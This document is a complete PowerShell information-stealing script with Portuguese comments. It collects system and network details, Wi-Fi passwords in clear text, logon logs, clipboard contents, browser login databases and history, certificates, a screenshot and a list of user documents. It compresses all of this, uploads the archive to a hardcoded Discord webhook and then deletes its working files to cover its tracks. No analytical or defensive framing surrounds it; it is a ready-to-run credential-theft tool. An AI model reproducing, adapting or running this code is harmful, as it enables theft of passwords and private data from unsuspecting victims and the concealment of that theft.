# KIT v2.3 – 10 MB max, PS 7.5.4, sem erros
$hook="https://discord.com/api/webhooks/1458595316336037923/LcenEw4uom3H_-llTphqVq0Rr2uLqyFwSAk3HJ7E1UCWoCEL-wJ1Qp4HDcHdlSH7vYkV"
$kit="$env:TEMP\k"; ni -ItemType Directory $kit -Force |Out-Null

# 1) TXT leves
systeminfo |Out-File $kit\sys.txt -Encoding UTF8
Get-CimInstance Win32_ComputerSystem |Out-File $kit\hw.txt -Encoding UTF8
Get-CimInstance Win32_Processor |Out-File $kit\hw.txt -Append -Encoding UTF8
Get-CimInstance Win32_BIOS |Out-File $kit\hw.txt -Append -Encoding UTF8
Get-NetIPConfiguration |Out-File $kit\net.txt -Encoding UTF8
netsh wlan export profile key=clear folder=$kit |Out-Null
Get-CimInstance Win32_UserAccount |Out-File $kit\usr.txt -Encoding UTF8
net localgroup administradores |Out-File $kit\adm.txt -Encoding UTF8
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 100 -EA 0|Select TimeCreated,Message |Out-File $kit\log.txt -Encoding UTF8
Get-Clipboard |Out-File $kit\clip.txt -Encoding UTF8
Get-ChildItem $env:APPDATA\Microsoft\Windows\Recent -Name |Out-File $kit\rec.txt -Encoding UTF8

# 2) Navegadores – copia só se existir
@('Login Data','History','logins.json')| %{
  Get-ChildItem $env:LOCALAPPDATA,$env:APPDATA -Recurse -File -Filter $_ -EA 0|Select -First 1| %{
    Copy-Item $_.FullName "$kit\$($_.Name)" -EA 0
  }
}

# 3) Certificados
Get-ChildItem Cert:\CurrentUser\My|Select Subject,Thumbprint,NotAfter |Out-File $kit\certs.txt -Encoding UTF8

# 4) Screenshot 800×600 JPG
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$bounds=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp=New-Object System.Drawing.Bitmap(800,600)
$g=[System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen($bounds.Left,$bounds.Top,0,0,[System.Drawing.Size]::new(800,600),[System.Drawing.CopyPixelOperation]::SourceCopy)
$encoder=[System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()[1]
$p=New-Object System.Drawing.Imaging.EncoderParameters(1)
$p.Param[0]=New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality,60)
$bmp.Save("$kit\ss.jpg",$encoder,$p); $g.Dispose(); $bmp.Dispose()

# 5) Top 100 arquivos
$ext=@('*.pdf','*.doc*','*.xls*','*.txt','*.csv','*.db','*.sqlite','*.pst')
Get-ChildItem C:\ -Include $ext -Recurse -Depth 2 -EA 0|Select FullName,Length,LastWriteTime|Sort Length -Descending|Select -First 100|Export-Csv "$kit\t.csv" -NoTypeInformation

# 6) ZIP ≤ 10 MB
Compress-Archive $kit "$kit.zip" -CompressionLevel Optimal
if((Get-Item "$kit.zip").Length -gt 10MB){
  Remove-Item "$kit\ss.jpg"
  Compress-Archive -Update -Path $kit -DestinationPath "$kit.zip" -CompressionLevel Optimal
}

# 7) Envia
Invoke-RestMethod $hook -Method Post -InFile "$kit.zip" -ContentType 'application/zip'

# 8) Limpa
Remove-Item $kit -Recurse -Force; Remove-Item "$kit.zip" -Force
